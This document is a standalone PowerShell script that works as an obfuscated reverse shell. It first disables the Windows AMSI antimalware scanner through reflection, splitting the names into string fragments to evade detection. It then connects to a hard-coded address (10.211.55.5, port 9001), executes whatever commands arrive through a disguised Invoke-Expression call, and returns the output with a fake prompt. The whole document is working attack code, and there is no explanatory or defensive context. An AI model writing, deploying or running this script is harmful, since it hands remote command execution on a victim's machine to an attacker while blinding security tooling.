
$m = [Ref].Assembly.GetType('System.Management.Automation.' + 'Am' + 'si' + 'Ut' + 'ils')
$f = $m.GetField('am' + 'si' + 'Init' + 'Failed','NonPublic,Static')
$f.SetValue($null,$true)


$h = "10.211.55.5"
$p = 9001


$t = New-Object System.Net.Sockets.TCPClient($h, $p)
$z = $t.GetStream()
$d = New-Object Byte[] 65535


While(($i = $z.Read($d, 0, $d.Length)) -ne 0) {
   
    $g = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($d, 0, $i)
    
  
    $e = 'i' + 'ex'
    $k = Try {
   
        &(Get-Alias $e) $g 2>&1 | Out-String
    } Catch {
        $_.Exception.Message
    }
    
  
    $s = $k + "PS " + (Get-Location).Path + "> "
    $x = ([text.encoding]::ASCII).GetBytes($s)
    $z.Write($x, 0, $x.Length)
    $z.Flush()
}
$t.Close()
